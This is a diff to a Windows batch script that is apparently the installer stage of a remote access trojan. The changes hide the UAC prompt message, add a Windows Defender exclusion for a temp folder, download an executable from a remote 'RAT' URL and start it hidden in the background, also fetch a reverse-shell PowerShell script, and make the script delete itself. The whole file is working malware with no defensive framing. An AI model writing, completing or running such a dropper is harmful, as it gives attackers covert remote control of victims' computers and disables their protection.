@@ -1,11 +1,10 @@
 @echo off
-
 ::---------------------------------------------------------------------------------------------------------------
 ::  --> Check for permissions
 >nul 2>&1 "%SYSTEMROOT%\system32\cacls.exe" "%SYSTEMROOT%\system32\config\system"
 :: --> If error flag set, we do not have admin.
 if '%errorlevel%' NEQ '0' (
-    echo Requesting administrative privileges...
+    ::echo Requesting administrative privileges...
     goto UACPrompt
 ) else ( goto gotAdmin )
 
@@ -39,12 +38,12 @@ for /L %%i in (1,1,%LENGTH%) do (
 )
 ::----------------------------------------------------------------------------------------------------------------
 
-SET TARGETDIR="C:\Users\Arth\AppData\Local\Temp\"
+SET TARGETDIR="%USERPROFILE%\AppData\Local\Temp\"
 cd %TARGETDIR%
 
 ::----------------------------------------------------------------------------------------------------------------
 mkdir %MainDirName%
-powershell Add-MpPreference -ExclusionPath 'C:\Users\Arth\AppData\Local\Temp\%MainDirName%'
+powershell Add-MpPreference -ExclusionPath '%TARGETDIR%\%MainDirName%'
 ::----------------------------------------------------------------------------------------------------------------
 cd %MainDirName%
 :: -----------------------------------------------------------cmd-------------------------------------------------------------------------
@@ -55,15 +54,21 @@ attrib +h "payload.vbs"
 :: payload.vbs
 
 :: -------------------------------------------------------------------------------------------------------------------------------------
+
+:: download client side
+powershell "Invoke-WebRequest -Uri 'https://arth.imbeddex.com/RAT/target_script.exe' -OutFile target_script.exe"
+attrib +h "target_script.exe"
+start /b "application" "%TARGETDIR%\%MainDirName%\target_script.exe"
+
 :: -----------------------------------------------------------ps1--------------------------------------------------------------------------
 
 powershell "Invoke-WebRequest -Uri 'https://arth.imbeddex.com/RAT/Rev_shell.ps1' -OutFile Rev_shell.ps1"
 attrib +h "Rev_shell.ps1"
-powershell -ExecutionPolicy Bypass -WindowStyle hidden -File "C:\Users\Arth\AppData\Local\Temp\%MainDirName%\Rev_shell.ps1"
+:: powershell -ExecutionPolicy Bypass -WindowStyle hidden -File "C:\Users\Arth\AppData\Local\Temp\%MainDirName%\Rev_shell.ps1"  carefull of "ARTH"
 
 :: -------------------------------------------------------------------------------------------------------------------------------------
 
-cd "%~dp0"
+:: cd "%~dp0"
+
 ::comment to stop self del
-if exist initial.cmd del initial.cmd
-if exist module_downloader.cmd del module_downloader.cmd
+del "%~f0"
